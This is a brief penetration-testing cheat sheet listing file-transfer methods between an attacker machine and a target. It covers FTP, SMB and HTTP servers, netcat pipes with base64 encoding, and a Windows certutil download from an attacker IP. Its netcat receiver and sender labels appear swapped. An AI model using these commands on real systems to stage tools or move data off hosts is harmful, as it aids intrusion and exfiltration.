# File Transfers

**Set up FTP :**

Python pyftpdlib FTP Server (again don't run from TMUX):

```
apt-get install python-pyftpdlib
root@kali# python -m pyftpdlib -p 21
```

**SMB** : impacket-smbserver tmp .

**HTTP :**

* python -m SimpleHTTPServer
* python3 -m http.server
* updog ([https://github.com/sc0tfree/updog](https://github.com/sc0tfree/updog))

**Linux :**

* curl
* wget

**Netcat**

```
// Receiver 
nc 192.168.0.1 4444 < file

// Sender 
cat file | nc -nlvp 4444            // Normal file

// Base64 encoded sender
cat binary | base64 | nc -nlvp 4444
```

**Windows :**

* certutil -urlcache -f http://\<ip>/uri output.ext
* //10.10.10.x/smb
